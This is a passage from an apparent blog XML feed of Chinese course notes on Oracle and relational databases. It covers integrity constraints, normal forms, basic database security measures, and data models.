<td align="left">当某列的值不能为空值时（即要求新建或修改元组时， （即要求新建或修改元组时，该列必须填入值），则可以在设置为非空值约束</td>
<td align="left">列级约束</td>
</tr>
<tr>
<td align="left">唯一型约束</td>
<td align="left">UNIQUE</td>
<td align="left">用于限定基本表上的某个列或某些列的组合（称为唯一性键），在不同元组（行）中的取值不能相同（空值除外）。</td>
<td align="left">可以是列级约束也可以是表级约束</td>
</tr>
<tr>
<td align="left">主键约束</td>
<td align="left">PRIMARY KEY</td>
<td align="left">用于定义基本表的主键（码），以实现实体完整性规则。</td>
<td align="left">可以是列级约束也可以是表级约束</td>
</tr>
<tr>
<td align="left">外键约束</td>
<td align="left">FOREIGN KEY</td>
<td align="left">是一个表（称外键表、从表或参照关系）中的一个或多个列的组合，它的取值要么为空值，要么是引用另一个表（称主键表、主表或被参照关系）的主键或唯一性键的值。</td>
<td align="left">可以是列级约束也可以是表级约束</td>
</tr>
<tr>
<td align="left">检查约束</td>
<td align="left">CHECK</td>
<td align="left">可以定义插入或修改某个元组时，元组应满足的约束条件，通常用于限定某个列的取值范围或与其他列的关系。</td>
<td align="left">可以是列级约束也可以是表级约束</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Note</category>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库关系范式</title>
    <url>/2019/12/17/Oracle/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%85%B3%E7%B3%BB%E8%8C%83%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="数据库关系范式"><a href="#数据库关系范式" class="headerlink" title="数据库关系范式"></a>数据库关系范式</h1><h2 id="数据依赖"><a href="#数据依赖" class="headerlink" title="数据依赖"></a>数据依赖</h2><p><strong>关系模式中的各属性之间相互依赖、相互制约的联系称为数据依赖</strong></p>
<ul>
<li><p>函数依赖</p>
</li>
<li><p>多值依赖</p>
</li>
<li><p>连接依赖</p>
<a id="more"></a>
<h2 id="关系模式应满足的基本要求"><a href="#关系模式应满足的基本要求" class="headerlink" title="关系模式应满足的基本要求"></a>关系模式应满足的基本要求</h2></li>
<li><p>数据库中的数据冗余应该尽可能的少</p>
</li>
<li><p>关系数据库不能因为数据更新操作而引起数据不一致的问题</p>
</li>
<li><p>插入数据时，不能产生插入异常现象</p>
</li>
<li><p>删除数据时，不能产生删除异常现象</p>
</li>
<li><p>数据库设计应考虑查询要求，数据组织应合理</p>
</li>
</ul>
<h2 id="完全函数依赖和部分函数依赖"><a href="#完全函数依赖和部分函数依赖" class="headerlink" title="完全函数依赖和部分函数依赖"></a>完全函数依赖和部分函数依赖</h2><p>(Sno,Cno)-&gt;Grade(完全函数依赖)</p>
<p>学号和课程号组成集合才能一定推出唯一的成绩，所以(Sno,Cno)为决定因素</p>
<p>因为Sno-&gt;Age所以(Sno,Cno)-&gt;Age(部分函数依赖)</p>
<p>学号是学号和课程号组成集合的子集,而学号就可以推出年龄,所以年龄部分函数依赖于(Sno,Cno)这个集合</p>
<p><strong>说明</strong></p>
<ul>
<li>只用当决定因素是组合属性时，讨论部分函数依赖才有意义</li>
<li>当决定是单属性时，只能是完全函数依赖</li>
<li>例如，在关系模式S（SNO，SN，AGE，DEPT），决定因素为单属性SNO，有SNO-&gt;（SN，AGE，DEPT），不存在部分函数依赖。</li>
</ul>
<h2 id="范式"><a href="#范式" class="headerlink" title="范式"></a>范式</h2><ul>
<li><strong>基本思想：</strong>消除关系模式中的数据冗余，消除数据依赖中的不合适的部分，解决数据插入、删除时发生异常现象</li>
<li><strong>范式：</strong>把关系数据库设计出来的关系模式要满足一定的条件。</li>
<li><strong>第一范式：</strong>满足基本规范要求的关系模式</li>
<li><strong>第二范式：</strong>在第一范式中进一步满足一些要求</li>
<li><strong>第三范式：</strong>以此类推产生了第三范式等概念</li>
<li><strong>注意：</strong>每个范式都规定了一些限制条件</li>
</ul>
<h3 id="第一范式"><a href="#第一范式" class="headerlink" title="第一范式"></a>第一范式</h3><ul>
<li><strong>定义：</strong>如果一个关系模式R中的所有属性都是不可分的最小数据项，则R∈1NF</li>
<li>注意：<ul>
<li>NF是关系模式的一个最起码的要求</li>
<li>不满足1NF的数据库模式不能称之为关系数据库</li>
<li>但满足1NF的关系模式不一定是好的关系模式</li>
</ul>
</li>
</ul>
<h3 id="第二范式"><a href="#第二范式" class="headerlink" title="第二范式"></a>第二范式</h3><ul>
<li><strong>定义：</strong>如果关系模式R∈1NF，且R中每一个非主属性完全函数依赖于码，则R∈2NF</li>
<li>结论：<ol>
<li>从1NF关系中消除非主属性对关系键的部分函数依赖，则可得到2NF关系</li>
<li>如果R的关系为单属性，或R的全体属性均为主属性，则R∈2NF</li>
</ol>
</li>
<li>2NF规范化<ul>
<li>2NF规范化是指把1NF关系模式通过投影分解转换成2NF关系模式的集合</li>
<li>分解时遵循的基本原则就是“一事一地”，让一个关系只描述一个实体或者实体间的联系。如果多于一个实体或联系，则进行投影分解</li>
</ul>
</li>
</ul>
<h3 id="第三范式"><a href="#第三范式" class="headerlink" title="第三范式"></a>第三范式</h3><ul>
<li><strong>定义：</strong>如果关系模式R∈2NF，且R中每个非主属性都不传递依赖于码，则R∈3NF</li>
<li>3NF规范化：<ul>
<li>3NF是指把2NF关系模式通过投影分解转换成3NF关系模式的集合</li>
<li>和2NF规范化时遵循的原则相同，即“一事一地”，让一个关系只描述一个实体或者实体间的联系</li>
</ul>
</li>
</ul>
<h3 id="BC范式"><a href="#BC范式" class="headerlink" title="BC范式"></a>BC范式</h3><ul>
<li><strong>定义：</strong>关系模式R(U,F)∈1NF，若对R的每个函数依赖x-&gt;y，有x必含候选码，则R∈BCNF</li>
<li>优点：<ul>
<li>数据冗余降低</li>
<li>不存在插入异常</li>
<li>不存在删除异常</li>
<li>不存在更新异常</li>
</ul>
</li>
<li>性质：<ul>
<li>若R∈BCNF，则R∈2NF</li>
<li>若R∈BCNF，则R∈3NF</li>
<li>若R∈3NF，则R不一定是BCNF</li>
<li>若R∈3NF，且候选码唯一，则R是BCNF</li>
</ul>
</li>
</ul>
<h3 id="第四范式"><a href="#第四范式" class="headerlink" title="第四范式"></a>第四范式</h3><ul>
<li><strong>定义：</strong>关系模式R(U,D)∈1NF，U是属性全集，x，y是U的子集，D是R上的数据依赖集，如果对R的每个非平凡多值依赖X-&gt;-&gt;y，x都含候选码，则R∈4NF。</li>
<li></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(1) R是BCNF。R候选关键字为XY，F中只有一个函数依赖，而该函数依赖的左部包含了R的候选关键字。</span><br><span class="line"></span><br><span class="line">   (2) R是3NF。R候选关键字为X Y和XZ，R中所有属性都是主属性，不存在非主属性对候选关键字的传递依赖。</span><br><span class="line"></span><br><span class="line">   (3) R是BCNF。R候选关键字为X和Y，因为X→YZ，所以X→Y，X→Z，由于F中有Y→Z，Y→X，因此Z是直接函数依赖于X，而不是传递依赖于X。又因为F的每一函数依赖的左部都包含了任一候选关键字，所以R是BCNF。</span><br><span class="line"></span><br><span class="line">   (4) R是BCNF。R候选关键字为X，而且F中每一个函数依赖的左部包含了候选关键字X。</span><br><span class="line"></span><br><span class="line">   (5) R是1NF。R候选关键字为WX，则Y，Z为非主属性，又由于X→Z，因此F中存在非主属性对候选关键字的部分函数依赖</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Note</category>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库安全</title>
    <url>/2019/12/17/Oracle/%E7%AC%AC10%E5%91%A8%E8%AF%BE/</url>
    <content><![CDATA[<h1 id="第十周课数据库安全"><a href="#第十周课数据库安全" class="headerlink" title="第十周课数据库安全"></a>第十周课数据库安全</h1><h1 id="数据库安全"><a href="#数据库安全" class="headerlink" title="数据库安全"></a>数据库安全</h1><a id="more"></a>

<h2 id="数据库安全措施"><a href="#数据库安全措施" class="headerlink" title="数据库安全措施"></a>数据库安全措施</h2><p>1.用户标识和鉴定</p>
<ul>
<li>用户名和用户标识标明用户身份</li>
<li>口令</li>
<li>随机数对密码加密</li>
</ul>
<p>2.存取控制</p>
<p>根据预先定义好的用户权限进行存取控制</p>
<p>两部分:数据对象和操作类型</p>
<p>3.视图</p>
<ul>
<li>保证程序的逻辑独立性,将机密数据隐藏起来</li>
<li>不同的DBMS都提供了建立视图的机制</li>
<li>开发数据系统时,应尽可能给不同用户分配不同的视图</li>
</ul>
<p>4.审计</p>
<ul>
<li>审计时一种预防手段,监测可能的不合法访问</li>
<li>审讯追踪技术使用专门的文件或数据库访问自动记录用户对数据库的所有操作,利用这些信息就能找出非法存取数据的人</li>
<li></li>
<li></li>
</ul>
<p>5.数据加密</p>
<h3 id="ORACLE中的角色、用户、权限"><a href="#ORACLE中的角色、用户、权限" class="headerlink" title="ORACLE中的角色、用户、权限"></a>ORACLE中的角色、用户、权限</h3><p>角色分类</p>
<ul>
<li>用户类型</li>
<li>应用类型</li>
</ul>
<p>oracle预定义的角色</p>
<p>oracle允许DBA定义角色</p>
<p>CONNECT</p>
<p>RESOURCE</p>
<p>DBA</p>
<h2 id="数据库完整措施"><a href="#数据库完整措施" class="headerlink" title="数据库完整措施"></a>数据库完整措施</h2><h3 id="触发器"><a href="#触发器" class="headerlink" title="触发器"></a>触发器</h3>]]></content>
      <categories>
        <category>Note</category>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>Oracle数据库第二周</title>
    <url>/2019/12/17/Oracle/%E7%AC%AC2%E5%91%A8%E8%AF%BE/</url>
    <content><![CDATA[<h1 id="Oracle数据库第二周"><a href="#Oracle数据库第二周" class="headerlink" title="Oracle数据库第二周"></a>Oracle数据库第二周</h1><h2 id="1-1数据、信息与数据处理"><a href="#1-1数据、信息与数据处理" class="headerlink" title="1.1数据、信息与数据处理"></a>1.1数据、信息与数据处理</h2><ul>
<li>数据和信息</li>
<li>数据库和数据库表</li>
<li>数据库管理系统</li>
<li>数据库系统<a id="more"></a>
<h3 id="1-1基本概念"><a href="#1-1基本概念" class="headerlink" title="1.1基本概念"></a>1.1基本概念</h3></li>
</ul>
<h4 id="1-数据"><a href="#1-数据" class="headerlink" title="1.数据"></a>1.数据</h4><ul>
<li>**数据(Data)**：是数据库中存储的基本对象</li>
<li><strong>数据的定义</strong>：描述事物的符号记录，是信息的符号表示，或称载体</li>
<li><strong>数据的种类</strong>：数字、文本、图形、图像、声 ：数字、文本、图形、图像、声音、视频、学生的档案记录等</li>
<li><strong>信息</strong>：数据的内涵，是数据的语义解释</li>
<li><strong>数据处理</strong>:将数据转换成信息的过程，包括对数据收集、存储、分类、加工、检索、维护等一系列活动</li>
</ul>
<p><strong>总结</strong>：</p>
<ul>
<li><strong>数据是信息的载体 数据是信息的载体</strong></li>
<li><strong>数据是信息的表述方式 数据是信息的表述方式</strong></li>
<li><strong>信息是从数据而来的 信息是从数据而来的知识</strong></li>
</ul>
<h4 id="2-数据库"><a href="#2-数据库" class="headerlink" title="2.数据库"></a>2.数据库</h4><ul>
<li>**数据库(Database,简称 简称DB)**：是长期储存在计算机内、有组织、可共享的大量数据的集合</li>
<li><strong>基本特征</strong>：<ul>
<li>数据按一定的数据模型组织、描述和储存<ul>
<li>以文件方式存储，常见数据库文件扩展名：<ul>
<li>MDF-SQL Server；</li>
</ul>
</li>
</ul>
</li>
<li>MDB-Access；</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- DBC-VFP（Visual FoxPro）</span><br></pre></td></tr></table></figure>
<ul>
<li>可为各种用户共享</li>
<li>冗余度较小</li>
<li>数据独立性较高<ul>
<li>易扩展</li>
</ul>
</li>
</ul>
<h4 id="3-数据库管理系统"><a href="#3-数据库管理系统" class="headerlink" title="3.数据库管理系统"></a>3.数据库管理系统</h4><ul>
<li>**数据库管理系统（ 数据库管理系统（Database Management System，<br>简称 简称DBMS） **</li>
<li><strong>管理数据库的 管理数据库的系统软件 系统软件，是数据库系统的核心</strong></li>
<li><strong>位于用户与操作系统之间的一层数据管理软件</strong></li>
<li>主要功能：<ul>
<li>数据定义功能（DDL）</li>
<li>数据操纵功能（DML）：CRUD</li>
<li>数据库的事务管理和运行管理</li>
<li>数据库的建立和维护功能</li>
</ul>
</li>
</ul>
<h2 id="1-2数据管理技术的发展"><a href="#1-2数据管理技术的发展" class="headerlink" title="1.2数据管理技术的发展"></a>1.2数据管理技术的发展</h2><h4 id="新一代数据库"><a href="#新一代数据库" class="headerlink" title="新一代数据库"></a><strong>新一代数据库</strong></h4><ul>
<li>面向对象的数据库</li>
<li>分布式数据库</li>
<li>并行数据库</li>
<li>图形图像数据库</li>
</ul>
<h4 id="主流数据库："><a href="#主流数据库：" class="headerlink" title="主流数据库："></a><strong>主流数据库：</strong></h4><p>Oracle公司：Oracle、MySQL（开源）</p>
<p>Microsoft公司：Microsoft SQL Server</p>
<p>MySQL分支：MariaDB（开源）</p>
<p>参考链接：</p>
<p><a href="https://zhuanlan.zhihu.com/p/25179862">一图看数据库发展历史</a></p>
<p><a href="https://db-engines.com/en/ranking">数据库排名</a></p>
<h2 id="1-3数据库系统的组成"><a href="#1-3数据库系统的组成" class="headerlink" title="1.3数据库系统的组成"></a>1.3数据库系统的组成</h2><h3 id="数据库系统"><a href="#数据库系统" class="headerlink" title="数据库系统"></a>数据库系统</h3><h2 id="1-4模型"><a href="#1-4模型" class="headerlink" title="1.4模型"></a>1.4模型</h2><p><strong>根据应用目的，模型分为两个层次：</strong></p>
<h4 id="概念模型"><a href="#概念模型" class="headerlink" title="概念模型"></a><strong>概念模型</strong></h4><ul>
<li>按用户的观点，独立于计算机实现的，只用来描述和组织所关心的信息结构的概念数据模型，强调语义</li>
<li>数据库设计人员和用户之间进行交流的语言</li>
<li>对应于信息世界</li>
<li>概念模型用于信息世界的建模；</li>
<li>是现实世界到机器世界的第一层抽象；</li>
<li>是数据库设计的有力工具；</li>
<li>数据库设计人员和用户之间进行交流的语言；</li>
</ul>
<h4 id="数据模型"><a href="#数据模型" class="headerlink" title="数据模型"></a><strong>数据模型</strong></h4><ul>
<li>按计算机系统的观点，直接面向计算机系统的，描述数据库中数据的逻辑结构的基本数据模型</li>
<li>对应于数据世界（机器世界）</li>
<li>包括逻辑模型和物理模型</li>
<li>逻辑模型：采用某一数据模型组织数据，如关系模型。</li>
<li>物理模型：描述数据在系统内部的表示方式和存取方法</li>
<li>用来形式化描述<ul>
<li>数据</li>
<li>数据之间的联系</li>
<li>数据语义和约束规则</li>
</ul>
</li>
</ul>
<h5 id="数据模型的组成要素"><a href="#数据模型的组成要素" class="headerlink" title="数据模型的组成要素"></a><strong>数据模型的组成要素</strong></h5><ul>
<li>数据结构<ul>
<li><strong>数据结构的概念</strong><ul>
<li>描述数据库的组成对象，以及对象之间的联系</li>
</ul>
</li>
<li><strong>数据结构描述的内容</strong><ul>
<li>对象的数据类型、内容、性质，如关系模型中的属性</li>
<li>与数据之间联系有关的对象</li>
</ul>
</li>
</ul>
</li>
<li><strong>数据操作</strong><ul>
<li>对数据库中各种对象(型)的实例(值)允许执行的操作及有关的操作规则，是对系统动态特性的描述</li>
<li>数据操作的类型<ul>
<li>查询</li>
<li>更新(包括插入、删除、修改)</li>
</ul>
</li>
</ul>
</li>
<li><strong>数据的完整性约束</strong><ul>
<li>一组完整性规则的集合。</li>
<li>完整性规则：给定的数据模型中数据及其联系所具有的制约和依存规则</li>
<li>用以限定符合数据模型的数据库状态以及状态的变化，以保证数据的正确、有效、相容。</li>
</ul>
</li>
<li><strong>最常用的数据模型</strong><ul>
<li>非关系模型</li>
<li><strong>层次模型</strong>(Hierarchical Model)<ul>
<li>层次模型是数据库系统中最早出现的数据模型</li>
<li>层次数据库系统的典型代表是IBM公司1968年推出的IMS（Information Management System）数据库管理系统</li>
<li>层次模型用树形结构来表示各类实体以及实体间的联系</li>
<li>通过 通过树形结构表示实体及联系。如描述学校管理 形结构表示实体及联系。如描述学校管理机构。个 机构。每个结点 结点表示一个 表示一个实体（型） 实体（型），箭头表示 箭头表示实体（型）间的联系（由父到子）。</li>
<li>主要特点：<ul>
<li>有且仅有一个根结点；每个非根结点 非根结点有且仅有一个父(直接上层)结点。它最适合表示实体的一对多联系。</li>
</ul>
</li>
</ul>
</li>
<li><strong>网状模型</strong>(Network Model)<ul>
<li>典型代表是DBTG系统：<ul>
<li>70年代由DBTG提出的一个系统方案</li>
<li>奠定了数据库系统的基本概念、方法和技术</li>
</ul>
</li>
<li>实际系统</li>
<li>Cullinet Software Inc.公司的IDMS</li>
<li>Univac公司的DMS1100</li>
<li>Honeywell公司的IDS/2</li>
<li>HP公司的IMAGE</li>
<li>通过网状结构 网状结构表示实体及联系。“网”中每个结点表示一个实体(型)，结点之间箭头表示实体(型)间的联系。</li>
<li>网状数据模型主要特点：网状数据模型可能有多个根结点，某些非根结点可能有多个父结点，适合表示实体的多对多联系。</li>
<li>特点：<ul>
<li>适合复杂的关系</li>
<li>最少的数据冗余</li>
<li>算法复杂、专用</li>
<li>优点 优点:能直观、形象地描述实体及其联系，易于被人们所理解和掌握 。</li>
<li>缺点 缺点:数据结构较复杂，存储数据需要更多的链接指针；在检索数据时，需要考虑数据的存储路径；在插入或删除数据时，涉及到调整链接指针</li>
</ul>
</li>
</ul>
</li>
<li><strong>关系模型</strong>(Relational Model)<ul>
<li>1970年美国IBM公司San Jose研究室的研究员E.F.Codd首次提出了数据库系统的关系模型</li>
<li>关系数据结构：规范化的二维表 二维表（关系）</li>
<li>一个关系就是没有重复行和重复列的二维表，二维表的每一行在关系中称为元组，每一列在关系中称为属性。学生关系的每一行代表一个学生的记录，每一列代表学生记录的一个字段。属性个数（n）称为关系的元。</li>
<li>关系模型的组成<ul>
<li>关系数据结构<ul>
<li>单一的数据结构—-关系<ul>
<li>现实世界的实体以及实体间的各种联系均用关系来表示</li>
</ul>
</li>
<li>数据的逻辑结构—-二维表<ul>
<li>从用户角度，关系模型中数据的逻辑结构是一张二维表。</li>
</ul>
</li>
</ul>
</li>
<li>关系操作集合<ul>
<li>插入、删除、修改、查询（选择、投影、连接、除、并、交、差</li>
</ul>
</li>
<li>关系完整性约束<ul>
<li>实体完整性、参照完整性、域完整性、用户定义完整性</li>
</ul>
</li>
</ul>
</li>
<li>关系数据库就是一些相关的二维表和其他数据库对象的集合。</li>
<li>在这个定义中明确，关系数据库中的所有信息都存储在二维表格中；一个关系数据库可能包含多个表；除了这种二维表外，关系数据库还包含一些其他对象，如视图等。</li>
<li>概念<ul>
<li>关系<ul>
<li>是一张二维表，通常将一个无重复行、重复列的二维表看成一个关系，每个关系都有一个关系名。</li>
</ul>
</li>
<li>元组<ul>
<li>二维表的每一行在关系中称为元组。描述了现实世界中的一个实体或不同实体间的一种联系。</li>
</ul>
</li>
<li>属性<ul>
<li>二维表的每一列在关系中称为属性，每个属性都有一个属性名，各个属性的取值称为属性值。每个属性有一定的取值范围，称为值域。</li>
</ul>
</li>
<li>域 （Domain）<ul>
<li>关系中每个属性的值是有一定变化范围，每一个属性所对应的变化范围叫做属性的变域或简称域，它是属性值的集合，关系中所有属性的实际取值必须来自于它对应的域。</li>
</ul>
</li>
<li>分量<ul>
<li>一个元组在一个属性域上的取值称为该元组在此属性上的分量。</li>
</ul>
</li>
<li>关系模式<ul>
<li>二维表的表头那一行称为关系模式 关系模式，即一个关系的关系名及其全部属性名的集合。关系模式是概念模型中实体型及实体型之间联系的数据模型表示。</li>
<li>一般表示为：关系名（属性名1，属性名2 ，……，属性名n）</li>
<li>关系模式指出了一个关系的结构；而关系则是由满足关系模式结构的元组构成的集合。关系模式是稳定的、静态的，而关系则是随时间变化的、动态的。</li>
</ul>
</li>
<li>候选码<ul>
<li>若关系中的某一属性或属性组合的值能唯一地标识一个元组，则称该属性组为候选码</li>
<li>在最简单的情况下，候选码只包含一个属性。</li>
<li>在最极端的情况下，关系模式的所有属性组是这个关系模式的候选码，称为全码（All-key）</li>
</ul>
</li>
<li>主码（主键）（Primary key）<ul>
<li>若一个关系有多个候选码，则选定其中一个为主码（Primary key）</li>
<li>主码的各个属性称为主属性（Prime attribute）</li>
<li>不包含在任何侯选码中的属性称为非主属性（Non-key attribute）</li>
</ul>
</li>
<li>外码（外键）(Foreign Key)<ul>
<li>如果关系中某个属性或属性组合并非码，但却是另一个关系的主码，则称此属性或属性组合为本关系的外码或外键(Foreign Key)。在关系数据库中，用外码表示两个表间的联系。</li>
</ul>
</li>
</ul>
</li>
<li>基本特征<ul>
<li>有坚实的理论基础 （关系代数）<ul>
<li>几个元素组成的一个有序组称为一个元组，通常元组是用圆括号括起来的一些元素表示，元素间使用逗号分隔。 例如 (E001,钱达理,男,东风路78号)是元组的例子。</li>
<li>在关系数据库中，可以把一个表的每一行看作一个元组。</li>
</ul>
</li>
<li>数据结构简单、易于理解</li>
<li>对用户提供了较全面的操作支持</li>
<li>得到了众多开发商的支持</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="1-5数据库系统结构"><a href="#1-5数据库系统结构" class="headerlink" title="1.5数据库系统结构"></a>1.5数据库系统结构</h2><h4 id="概念模型的一种表示方法"><a href="#概念模型的一种表示方法" class="headerlink" title="概念模型的一种表示方法"></a>概念模型的一种表示方法</h4><ul>
<li>数据库系统内部结构<ul>
<li>从数据库管理系统角度看，数据库系统通常采用三级模式结构，是数据库系统内部的系统结构</li>
</ul>
</li>
<li>数据库系统外部结构<ul>
<li>从数据库最终用户角度看，数据库系统的结构分为:单用户结构；客户/服务器结构；浏览器／应用服务器／数据库服务器多层结构等。</li>
</ul>
</li>
</ul>
<h4 id="数据库系统的三级模式结构"><a href="#数据库系统的三级模式结构" class="headerlink" title="数据库系统的三级模式结构"></a>数据库系统的三级模式结构</h4><ul>
<li><p>为了有效地组织、管理数据，提高数据库的逻辑独立性和物理独立性，人们为数据库设计了一个严谨的体系结构，数据库领域公认的标准结构是三级模式结构，即外模式、模式和内模式 。</p>
</li>
<li><p>根据各类人员与数据库的不同关系，可把视图分为三种</p>
<ul>
<li>对应于用户的外部视图</li>
<li>对应于应用程序员的概念视图</li>
<li>对应于系统程序员的内部视图</li>
</ul>
</li>
<li><p>模式（Schema，也称逻辑模式）</p>
<ul>
<li><p>数据库中全体数据的逻辑结构和特征的描述</p>
</li>
<li><p>所有用户的公共数据视图，综合了所有用户的需求</p>
</li>
<li><p>一个数据库只有一个模式</p>
</li>
<li><p>模式的地位</p>
<p>：是数据库系统模式结构的中间层</p>
<ul>
<li>与数据的物理存储细节和硬件环境无关</li>
<li>与具体的应用程序、开发工具及高级程序设计语言无关</li>
</ul>
</li>
</ul>
</li>
<li><p>外模式</p>
<ul>
<li>也称子模式或用户模式</li>
<li>数据库用户（包括应用程序员和最终用户）使用的局部数据的逻辑结构和特征的描述</li>
<li>数据库用户的数据视图，是与某一应用有关的数据的逻辑表示</li>
<li><strong>外模式的地位：</strong>介于模式与应用之间</li>
<li>外模式与应用的关系：<ul>
<li>同一外模式也可以为多个应用系统所使用</li>
<li>但一个应用程序只能使用一个外模式</li>
</ul>
</li>
<li>模式与外模式的关系：<ul>
<li>外模式通常是模式的子集</li>
<li>一个数据库可以有多个外模式。反映了不同的用户的应用需求、看待数据的方式、对数据保密的要求</li>
</ul>
</li>
</ul>
</li>
<li><p>内模式</p>
<ul>
<li>是数据物理结构和存储方式的描述</li>
<li>是数据在数据库内部的表示方式<ul>
<li>记录的存储方式（顺序存储，按照B树结构存储）</li>
<li>索引的组织方式</li>
<li>数据是否压缩存储</li>
<li>数据是否加密</li>
<li>一个数据库只有一个内模式</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="数据库的两级映像"><a href="#数据库的两级映像" class="headerlink" title="数据库的两级映像"></a>数据库的两级映像</h4><ul>
<li>三级模式是对数据的三个抽象级别</li>
<li>二级映象在DBMS内部实现这三个抽象层次的联系和转换</li>
<li>外模式\模式映像<ul>
<li>保证数据的逻辑独立性</li>
<li>同一个模式可以有任意多个外模式，外模式／模式映象，定义外模式与模式之间的对应关系； 当模式改变时，外模式／模式映象使外模式保持不变；</li>
<li>应用程序是依据数据的外模式编写的，从而不必修改应用程序，保证了数据与程序的逻辑独立性</li>
</ul>
</li>
<li>模式／内模式映象<ul>
<li>保证数据的物理独立性。</li>
<li>模式／内模式映象定义了数据全局逻辑结构 全局逻辑结构与存储结构 储结构之间的对应关系。</li>
<li>当数据库的存储结构改变了，模式／内模式映象使模式保持不变。</li>
<li>应用程序不受影响。保证了数据与程序的物理独立性</li>
</ul>
</li>
<li>数据库系统外部结构<ul>
<li>从数据库最终用户角度看（数据库系统外部的体系结构） ，数据库系统的结构分为:<ul>
<li>单用户数据库系统<ul>
<li>整个数据库系统(应用程序、DBMS、数据)装在一台计算机上，为一个用户独占，不同机器之间不能共享数据。</li>
</ul>
</li>
<li>集中式结构</li>
<li>客户／服务器</li>
<li>浏览器／应用服务器／数据库服务器多层结构等</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ul>
<li>数据管理的发展过程</li>
<li>数据库系统的组成</li>
<li>数据模型<ul>
<li>数据模型的三要素</li>
<li>概念模型， E-R模型</li>
<li>三种主要数据模型</li>
</ul>
</li>
<li>数据库系统结构<ul>
<li>数据库系统三级模式结构</li>
<li>数据库系统两级映像系统结构</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Note</category>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>Oracle数据库第三周</title>
    <url>/2019/12/17/Oracle/%E7%AC%AC3%E5%91%A8%E8%AF%BE/</url>
    <content><![CDATA[<h1 id="Oracle数据库第三周"><a href="#Oracle数据库第三周" class="headerlink" title="Oracle数据库第三周"></a>Oracle数据库第三周</h1><h2 id="关系数据库简介"><a href="#关系数据库简介" class="headerlink" title="关系数据库简介"></a>关系数据库简介</h2><ul>
<li>提出关系模型的是美国 提出关系模型的是美国IBM公司的 公司的E.F.Codd<ul>
<li>1970年提出关系数据模型 年提出关系数据模型<ul>
<li>E.F.Codd, “A Relational Model of Data for Large Shared Data Banks”, 《Communication of the ACM》1970</li>
</ul>
</li>
<li>之后，提出了关系代数和关系演算的概念</li>
<li>1972年提出了关系的第一、第二、第三范式</li>
<li>1974年提出了关系的 年提出了关系的BC范式</li>
</ul>
</li>
</ul>
<a id="more"></a>

<h2 id="关系数据库"><a href="#关系数据库" class="headerlink" title="关系数据库"></a>关系数据库</h2><h3 id="2-1关系数据结构及形式化定义"><a href="#2-1关系数据结构及形式化定义" class="headerlink" title="2.1关系数据结构及形式化定义"></a>2.1关系数据结构及形式化定义</h3><h4 id="2-1-1关系"><a href="#2-1-1关系" class="headerlink" title="2.1.1关系"></a>2.1.1关系</h4><ul>
<li>单一的数据结构 单一的数据结构—-关系<ul>
<li>现实世界的实体以及实体间的各种联系均用关系来表示逻辑结构—二维表</li>
</ul>
</li>
<li>从用户角度，关系模型中数据的逻辑结构是一张二维表</li>
<li>建立在集合代数的基础上</li>
</ul>
<p>补充</p>
<ol>
<li>域<ul>
<li>域是一组具有相同数据类型的值的集合</li>
</ul>
</li>
<li>笛卡尔积</li>
<li>关系</li>
</ol>
<h4 id="2-1-2关系模式"><a href="#2-1-2关系模式" class="headerlink" title="2.1.2关系模式"></a>2.1.2关系模式</h4><h5 id="1-什么是关系模式"><a href="#1-什么是关系模式" class="headerlink" title="1. 什么是关系模式"></a>1. 什么是关系模式</h5><ul>
<li>关系模式（ 关系模式（Relation Schema）是型</li>
<li>关系是值的集合</li>
<li>关系模式是对关系的描述<ul>
<li>元组集合的结构<ul>
<li>属性构成性构成</li>
<li>属性来自的域</li>
<li>属性与域之间的映象关系</li>
</ul>
</li>
<li>元组语义以及完整性约束条件</li>
<li>属性间的数据依赖关系集合</li>
</ul>
</li>
</ul>
<h5 id="2-定义关系模式"><a href="#2-定义关系模式" class="headerlink" title="2. 定义关系模式"></a>2. 定义关系模式</h5><p>关系模式可以形式化地表示为：</p>
<table>
<thead>
<tr>
<th align="left">表示</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">R</td>
<td align="left">关系名</td>
</tr>
<tr>
<td align="left">U</td>
<td align="left">组成该关系的属性名集合</td>
</tr>
<tr>
<td align="left">D</td>
<td align="left">属性组U中属性所来自的域</td>
</tr>
<tr>
<td align="left">DOM</td>
<td align="left">属性向域的映像集合</td>
</tr>
<tr>
<td align="left">F</td>
<td align="left">属性间的数据依赖关系集合</td>
</tr>
</tbody></table>
<h5 id="3-关系模式与关系"><a href="#3-关系模式与关系" class="headerlink" title="3. 关系模式与关系"></a>3. 关系模式与关系</h5><ul>
<li>关系模式<ul>
<li>对关系的描述</li>
<li>静态的、稳定的</li>
</ul>
</li>
<li>关系<ul>
<li>关系模式在某一时刻的状态或内容</li>
<li>动态的、随时间不断变化的</li>
</ul>
</li>
<li>关系模式和关系通常统称为关系</li>
<li>一般通过上下文加以区别</li>
</ul>
<h4 id="2-1-3关系数据库"><a href="#2-1-3关系数据库" class="headerlink" title="2.1.3关系数据库"></a>2.1.3关系数据库</h4><ul>
<li>关系数据库<ul>
<li>在一个给定的应用领域中，所有关系的集合构成一个关系数据库</li>
</ul>
</li>
<li>关系数据库的型与值<ul>
<li><strong>关系数据库的型：</strong>关系数据库模式（对关系数据库的描述）</li>
<li>关系数据库模式包括<ul>
<li>若干域的定义</li>
<li>在这些域上定义的若干关系模式</li>
</ul>
</li>
